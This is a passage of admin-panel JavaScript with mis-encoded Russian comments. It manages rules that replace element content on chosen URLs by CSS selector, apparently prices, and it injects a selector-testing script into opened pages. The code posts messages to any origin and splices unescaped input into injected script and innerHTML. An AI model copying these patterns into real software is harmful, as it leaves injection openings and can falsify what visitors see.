                            <div class="d-flex align-items-center">
                                <div class="url-preview" title="${item.url}">${item.url}</div>
                                <span class="badge bg-primary ms-2">${item.selector}</span>
                            </div>
                            <div class="d-flex justify-content-between align-items-center mt-1">
                                <div class="value-preview" title="${item.value}">${item.value}</div>
                                <div class="modified-time">${formatDate(item.timestamp)}</div>
                            </div>
                        </div>
                        <div class="actions">
                            <button class="btn btn-sm btn-info view-btn" data-url="${item.url}">
                                <i class="bi bi-eye"></i>
                            </button>
                            <button class="btn btn-sm btn-warning edit-btn" data-url="${item.url}">
                                <i class="bi bi-pencil"></i>
                            </button>
                            <button class="btn btn-sm btn-danger delete-btn" data-url="${item.url}">
                                <i class="bi bi-trash"></i>
                            </button>
                        </div>
                    `;
                    
                    // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –∫–Ω–æ–ø–æ–∫
                    const viewBtn = listItem.querySelector('.view-btn');
                    const editBtn = listItem.querySelector('.edit-btn');
                    const deleteBtn = listItem.querySelector('.delete-btn');
                    
                    viewBtn.addEventListener('click', () => showDetails(item.url));
                    editBtn.addEventListener('click', () => editItem(item.url));
                    deleteBtn.addEventListener('click', () => showDeleteConfirmation(item.url));
                    
                    customPagesListEl.appendChild(listItem);
                });
            }
            
            // –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
            function showDetails(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                document.getElementById('detailUrl').textContent = item.url;
                document.getElementById('detailSelector').textContent = item.selector;
                document.getElementById('detailValue').textContent = item.value;
                document.getElementById('detailTimestamp').textContent = formatDate(item.timestamp);
                
                const viewPageBtn = document.getElementById('viewPageBtn');
                viewPageBtn.href = item.url;
                
                const editItemBtn = document.getElementById('editItemBtn');
                editItemBtn.onclick = () => {
                    detailsModal.hide();
                    editItem(item.url);
                };
                
                detailsModal.show();
            }
            
            // –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–π –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
            function editItem(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                pageUrlInput.value = item.url;
                cssSelectorInput.value = item.selector;
                customValueInput.value = item.value;
                
                // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
                previewModification();
                
                // –ü—Ä–æ–∫—Ä—É—á–∏–≤–∞–µ–º –∫ —Ñ–æ—Ä–º–µ
                form.scrollIntoView({ behavior: 'smooth' });
            }
            
            // –ü–æ–∫–∞–∑–∞—Ç—å –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–∏—è
            function showDeleteConfirmation(url) {
                deleteUrl = url;
                document.getElementById('deleteModalUrl').textContent = url;
                deleteModal.show();
            }
            
            // –£–¥–∞–ª–µ–Ω–∏–µ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
            async function deleteCustomPage() {
                if (!deleteUrl) return;
                
                try {
                    const response = await fetch('/admin-api/delete-custom-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ url: deleteUrl })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏');
                    }
                    
                    showToast('–ù–∞—Å—Ç—Ä–æ–π–∫–∏ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã');
                    await loadCustomPages();
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è:', error);
                    showToast('–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏: ' + error.message, 'danger');
                } finally {
                    deleteModal.hide();
                    deleteUrl = '';
                }
            }
            
            // –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
            function testSelector() {
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                const value = customValueInput.value;
                
                if (!url || !selector) {
                    showToast('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ URL –∏ —Å–µ–ª–µ–∫—Ç–æ—Ä', 'warning');
                    return;
                }
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
                showToast('–û—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞...', 'info');
                
                // –û—Ç–∫—Ä—ã–≤–∞–µ–º –Ω–æ–≤–æ–µ –æ–∫–Ω–æ —Å —É–∫–∞–∑–∞–Ω–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ–π
                const testWindow = window.open(url, '_blank');
                
                // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —Å–∫—Ä–∏–ø—Ç –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ —Ç–µ—Å—Ç–æ–≤–æ–µ –æ–∫–Ω–æ
                const testScript = `
                (function() {
                    console.log('üîç –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É —Å–µ–ª–µ–∫—Ç–æ—Ä–∞:', '${selector.replace(/'/g, "\\'")}');
                    
                    // –°–æ–∑–¥–∞–µ–º —Å—Ç–∏–ª–∏ –¥–ª—è –ø–æ–¥—Å–≤–µ—Ç–∫–∏
                    const style = document.createElement('style');
                    style.textContent = \`
                        .selector-test-highlight {
                            outline: 3px solid red !important;
                            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5) !important;
                            position: relative !important;
                            background-color: rgba(255, 0, 0, 0.1) !important;
                        }
                        
                        .selector-test-overlay {
                            position: fixed;
                            bottom: 20px;
                            right: 20px;
                            background: rgba(0, 0, 0, 0.8);
                            color: white;
                            z-index: 999999;
                            padding: 15px;
                            border-radius: 5px;
                            font-family: Arial, sans-serif;
                            max-width: 300px;
                            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
                        }
                        
                        .selector-test-tooltip {
                            position: absolute;
                            background: rgba(0, 0, 0, 0.8);
                            color: white;
                            padding: 5px 10px;
                            border-radius: 3px;
                            font-size: 12px;
                            z-index: 999999;
                            max-width: 250px;
                            word-break: break-word;
                        }
                        
                        .selector-test-value {
                            color: #6ff;
                            font-family: monospace;
                            padding: 3px 6px;
                            background: rgba(0, 0, 0, 0.3);
                            border-radius: 3px;
                            margin: 5px 0;
                            display: block;
                            word-break: break-word;
                        }
                        
                        .selector-test-new-value {
                            color: #6f6;
                            font-family: monospace;
                            padding: 3px 6px;
                            background: rgba(0, 0, 0, 0.3);
                            border-radius: 3px;
                            margin: 5px 0;
                            display: block;
                            word-break: break-word;
                        }
                    \`;
                    document.head.appendChild(style);
                    
                    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
                    function checkSelector() {
                        try {
                            // –ù–∞—Ö–æ–¥–∏–º —ç–ª–µ–º–µ–Ω—Ç—ã –ø–æ —Å–µ–ª–µ–∫—Ç–æ—Ä—É
                            const elements = document.querySelectorAll('${selector.replace(/'/g, "\\'")}');
                            const found = elements && elements.length > 0;
                            const values = [];
                            
                            if (found) {
                                // –°–æ–∑–¥–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–µ –æ–∫–Ω–æ
                                const overlay = document.createElement('div');
                                overlay.className = 'selector-test-overlay';
                                overlay.innerHTML = \`
                                    <div style="font-weight: bold; margin-bottom: 10px;">
                                        –ù–∞–π–¥–µ–Ω–æ —ç–ª–µ–º–µ–Ω—Ç–æ–≤: \${elements.length}
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <span style="color: #aaa;">–°–µ–ª–µ–∫—Ç–æ—Ä:</span>
                                        <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div id="selector-test-original-value">
                                        <span style="color: #aaa;">–¢–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ:</span>
                                    </div>
                                    <div style="margin: 10px 0;">
                                        <span style="color: #aaa;">–ë—É–¥–µ—Ç –∑–∞–º–µ–Ω–µ–Ω–æ –Ω–∞:</span>
                                        <div class="selector-test-new-value">${value.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                                        –ù–∞–∂–º–∏—Ç–µ ESC, —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å —ç—Ç–æ –æ–∫–Ω–æ
                                    </div>
                                \`;
                                document.body.appendChild(overlay);
                                
                                // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –∫–∞–∂–¥—ã–π –Ω–∞–π–¥–µ–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç
                                elements.forEach((el, index) => {
                                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ
                                    values.push(el.innerHTML);
                                    
                                    // –î–æ–±–∞–≤–ª—è–µ–º –∫–ª–∞—Å—Å –¥–ª—è –ø–æ–¥—Å–≤–µ—Ç–∫–∏
                                    el.classList.add('selector-test-highlight');
                                    
                                    // –°–æ–∑–¥–∞–µ–º –≤—Å–ø–ª—ã–≤–∞—é—â—É—é –ø–æ–¥—Å–∫–∞–∑–∫—É
                                    const tooltip = document.createElement('div');
                                    tooltip.className = 'selector-test-tooltip';
                                    tooltip.innerHTML = \`–≠–ª–µ–º–µ–Ω—Ç #\${index + 1}\`;
                                    
                                    // –ü–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä—É–µ–º –ø–æ–¥—Å–∫–∞–∑–∫—É
                                    const rect = el.getBoundingClientRect();
                                    tooltip.style.top = (rect.top + window.scrollY - 30) + 'px';
                                    tooltip.style.left = (rect.left + window.scrollX) + 'px';
                                    
                                    document.body.appendChild(tooltip);
                                    
                                    // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–≤–µ–¥–µ–Ω–∏—è
                                    el.addEventListener('mouseenter', () => {
                                        el.style.backgroundColor = 'rgba(255, 0, 0, 0.3) !important';
                                        tooltip.style.backgroundColor = 'rgba(255, 0, 0, 0.8)';
                                    });
                                    
                                    el.addEventListener('mouseleave', () => {
                                        el.style.backgroundColor = 'rgba(255, 0, 0, 0.1) !important';
                                        tooltip.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
                                    });
                                    
                                    // –ü—Ä–æ–∫—Ä—É—á–∏–≤–∞–µ–º –∫ –ø–µ—Ä–≤–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É
                                    if (index === 0) {
                                        el.scrollIntoView({
                                            behavior: 'smooth',
                                            block: 'center'
                                        });
                                    }
                                });
                                
                                // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞
                                if (values.length > 0) {
                                    const valueDisplay = document.getElementById('selector-test-original-value');
                                    valueDisplay.innerHTML += \`<div class="selector-test-value">\${values[0].replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>\`;
                                }
                                
                                // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∞–≤–∏—à–∏ ESC –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –æ–∫–Ω–∞
                                document.addEventListener('keydown', (e) => {
                                    if (e.key === 'Escape') {
                                        const overlay = document.querySelector('.selector-test-overlay');
                                        if (overlay) overlay.remove();
                                        
                                        document.querySelectorAll('.selector-test-tooltip').forEach(el => el.remove());
                                        document.querySelectorAll('.selector-test-highlight').forEach(el => {
                                            el.classList.remove('selector-test-highlight');
                                        });
                                    }
                                });
                                
                                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ –æ–∫–Ω–æ
                                window.opener.postMessage({
                                    type: 'selectorTestResult',
                                    found: true,
                                    count: elements.length,
                                    currentValue: values[0] || ''
                                }, '*');
                                
                                console.log('‚úÖ –°–µ–ª–µ–∫—Ç–æ—Ä –ø—Ä–æ–≤–µ—Ä–µ–Ω, –Ω–∞–π–¥–µ–Ω–æ —ç–ª–µ–º–µ–Ω—Ç–æ–≤:', elements.length);
                            } else {
                                console.warn('‚ö†Ô∏è –≠–ª–µ–º–µ–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –ø–æ —Å–µ–ª–µ–∫—Ç–æ—Ä—É:', '${selector.replace(/'/g, "\\'")}');
                                
                                // –°–æ–∑–¥–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–µ –æ–∫–Ω–æ —Å –æ—à–∏–±–∫–æ–π
                                const overlay = document.createElement('div');
                                overlay.className = 'selector-test-overlay';
                                overlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                                overlay.innerHTML = \`
                                    <div style="font-weight: bold; margin-bottom: 10px;">
                                        ‚ö†Ô∏è –≠–ª–µ–º–µ–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã!
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <span style="color: #aaa;">–°–µ–ª–µ–∫—Ç–æ—Ä:</span>
                                        <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div style="margin-top: 15px;">
                                        <button id="try-simpler-selector" style="background: #555; border: none; color: white; padding: 5px 10px; border-radius: 3px; cursor: pointer;">
                                            –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä
                                        </button>
                                    </div>
                                    <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                                        –ù–∞–∂–º–∏—Ç–µ ESC, —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å —ç—Ç–æ –æ–∫–Ω–æ
                                    </div>
                                \`;
                                document.body.appendChild(overlay);
                                
                                // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–Ω–æ–≥–æ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
                                document.getElementById('try-simpler-selector').addEventListener('click', () => {
                                    // –ü—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç —Ü–µ–Ω—ã –ª—é–±—ã–º —Å–ø–æ—Å–æ–±–æ–º
                                    const priceSelectors = [
                                        'app-page-inventory-price > div > span:first-child',
                                        'app-page-inventory-price span',
                                        '[class*="price"] > span',
                                        '[class*="price-value"]',
                                        'span[class*="price"]'
                                    ];
                                    
                                    // –£–¥–∞–ª—è–µ–º —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ
                                    overlay.remove();
                                    
                                    // –ü—Ä–æ–±—É–µ–º –∫–∞–∂–¥—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä
                                    for (const simplifiedSelector of priceSelectors) {
                                        const elements = document.querySelectorAll(simplifiedSelector);
                                        if (elements && elements.length > 0) {
                                            // –ù–∞—à–ª–∏ —ç–ª–µ–º–µ–Ω—Ç—ã, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                                            const newOverlay = document.createElement('div');
                                            newOverlay.className = 'selector-test-overlay';
                                            newOverlay.style.backgroundColor = 'rgba(0, 150, 0, 0.8)';
                                            newOverlay.innerHTML = \`
                                                <div style="font-weight: bold; margin-bottom: 10px;">
                                                    ‚úÖ –ù–∞–π–¥–µ–Ω–æ —Å —É–ø—Ä–æ—â–µ–Ω–Ω—ã–º —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–º!
                                                </div>
                                                <div style="margin-bottom: 10px;">
                                                    <span style="color: #aaa;">–ù–æ–≤—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä:</span>
                                                    <div class="selector-test-value">\${simplifiedSelector}</div>
                                                </div>
                                                <div style="margin-bottom: 10px;">
                                                    <span style="color: #aaa;">–ù–∞–π–¥–µ–Ω–æ —ç–ª–µ–º–µ–Ω—Ç–æ–≤:</span>
                                                    <div class="selector-test-value">\${elements.length}</div>
                                                </div>
                                                <div style="margin-top: 10px;">
                                                    <button id="use-new-selector" style="background: #555; border: none; color: white; padding: 5px 10px; border-radius: 3px; cursor: pointer;">
                                                        –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ—Ç —Å–µ–ª–µ–∫—Ç–æ—Ä
                                                    </button>
                                                </div>
                                            \`;
                                            document.body.appendChild(newOverlay);
                                            
                                            // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
                                            elements.forEach((el, index) => {
                                                el.classList.add('selector-test-highlight');
                                                
                                                // –ü—Ä–æ–∫—Ä—É—á–∏–≤–∞–µ–º –∫ –ø–µ—Ä–≤–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É
                                                if (index === 0) {
                                                    el.scrollIntoView({
                                                        behavior: 'smooth',
                                                        block: 'center'
                                                    });
                                                }
                                            });
                                            
                                            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
                                            document.getElementById('use-new-selector').addEventListener('click', () => {
                                                window.opener.postMessage({
                                                    type: 'useNewSelector',
                                                    selector: simplifiedSelector,
                                                    count: elements.length,
                                                    currentValue: elements[0].innerHTML || ''
                                                }, '*');
                                                newOverlay.remove();
                                            });
                                            
                                            // –ù–∞—à–ª–∏ —á—Ç–æ-—Ç–æ, –ø—Ä–µ—Ä—ã–≤–∞–µ–º —Ü–∏–∫–ª
                                            return;
                                        }
                                    }
                                    
                                    // –ï—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞—à–ª–∏
                                    const failOverlay = document.createElement('div');
                                    failOverlay.className = 'selector-test-overlay';
                                    failOverlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                                    failOverlay.innerHTML = \`
                                        <div style="font-weight: bold; margin-bottom: 10px;">
                                            ‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–∞–∂–µ —Å —É–ø—Ä–æ—â–µ–Ω–Ω—ã–º–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞–º–∏!
                                        </div>
                                        <div style="margin-top: 10px;">
                                            –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π URL –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞.
                                        </div>
                                    \`;
                                    document.body.appendChild(failOverlay);
                                });
                                
                                // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∞–≤–∏—à–∏ ESC –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –æ–∫–Ω–∞
                                document.addEventListener('keydown', (e) => {
                                    if (e.key === 'Escape') {
                                        const overlay = document.querySelector('.selector-test-overlay');
                                        if (overlay) overlay.remove();
                                    }
                                });
                                
                                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ –æ–∫–Ω–æ
                                window.opener.postMessage({
                                    type: 'selectorTestResult',
                                    found: false,
                                    error: '–≠–ª–µ–º–µ–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã'
                                }, '*');
                            }
                        } catch (error) {
                            console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞:', error);
                            
                            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—à–∏–±–∫—É –≤ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ –æ–∫–Ω–æ
                            window.opener.postMessage({
                                type: 'selectorTestResult',
                                found: false,
                                error: error.message
                            }, '*');
                            
                            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É
                            const overlay = document.createElement('div');
                            overlay.className = 'selector-test-overlay';
                            overlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                            overlay.innerHTML = \`
                                <div style="font-weight: bold; margin-bottom: 10px;">
                                    ‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞!
                                </div>
                                <div style="margin-bottom: 10px;">
                                    <span style="color: #aaa;">–°–µ–ª–µ–∫—Ç–æ—Ä:</span>
                                    <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                </div>
                                <div style="margin-bottom: 10px;">
                                    <span style="color: #aaa;">–û—à–∏–±–∫–∞:</span>
                                    <div class="selector-test-value">\${error.message}</div>
                                </div>
                            \`;
                            document.body.appendChild(overlay);
                        }
                    }
                    
                    // –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ, –ø–æ–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≥—Ä—É–∑–∏—Ç—Å—è
                    setTimeout(checkSelector, 1000);
                    
                    // –¢–∞–∫–∂–µ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø—Ä–∏ –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
                    window.addEventListener('load', () => {
                        setTimeout(checkSelector, 500);
                    });
                })();
                `;
                
                // –î–æ–±–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–ø—Ç –≤ –Ω–æ–≤–æ–µ –æ–∫–Ω–æ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏
                testWindow.addEventListener('load', () => {
                    try {
                        // –°–æ–∑–¥–∞–µ–º –∏ –¥–æ–±–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–ø—Ç
                        const script = testWindow.document.createElement('script');
                        script.textContent = testScript;
                        testWindow.document.head.appendChild(script);
                    } catch (e) {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞ –≤ —Ç–µ—Å—Ç–æ–≤–æ–µ –æ–∫–Ω–æ:', e);
                        showToast('–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–µ–ª–µ–∫—Ç–æ—Ä: ' + e.message, 'danger');
                    }
                });
            }
            
            // –£–õ–£–ß–®–ï–ù–û: –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
            async function saveCustomPage(e) {
                e.preventDefault();
                
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                const value = customValueInput.value;
                
                if (!url || !selector || value === undefined) {
                    showToast('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è', 'danger');
                    return;
                }
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
                const submitBtn = document.querySelector('#customPageForm button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ...';
                
                try {
                    // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
                    const validationResponse = await fetch('/admin-api/validate-selector', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ selector })
                    });
                    
                    const validationData = await validationResponse.json();
                    if (!validationData.valid) {
                        throw new Error('–ù–µ–≤–µ—Ä–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä: ' + validationData.message);
                    }
                    
                    // –ó–∞—Ç–µ–º —Å–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
                    const response = await fetch('/admin-api/save-custom-page', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ url, selector, value })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏');
                    }
                    
                    showToast('‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã! –ò–∑–º–µ–Ω–µ–Ω–∏—è –≤—Å—Ç—É–ø—è—Ç –≤ —Å–∏–ª—É –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ.', 'success');
                    
                    // –ü—Ä–µ–¥–ª–∞–≥–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
                    if (confirm('–ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã. –•–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —á—Ç–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø—Ä–∏–º–µ–Ω–∏–ª–∏—Å—å?')) {
                        window.open(url, '_blank');
                    }
                    
                    await loadCustomPages();
                    
                    // –û—á–∏—â–∞–µ–º —Ñ–æ—Ä–º—É
                    document.getElementById('customPageForm').reset();
                    
                    // –û—á–∏—â–∞–µ–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
                    const previewContainer = document.getElementById('valuePreview');
                    if (previewContainer) {
                        previewContainer.remove();
                    }
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è:', error);
                    showToast('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏: ' + error.message, 'danger');
                } finally {
                    // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalText;
                }
            }
            
            // –ù–û–í–û–ï: –§—É–Ω–∫—Ü–∏—è –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∑–Ω–∞—á–µ–Ω–∏—è
            function previewModification() {
                const value = customValueInput.value;
                const previewContainer = document.getElementById('valuePreview');
                
                if (!previewContainer) {
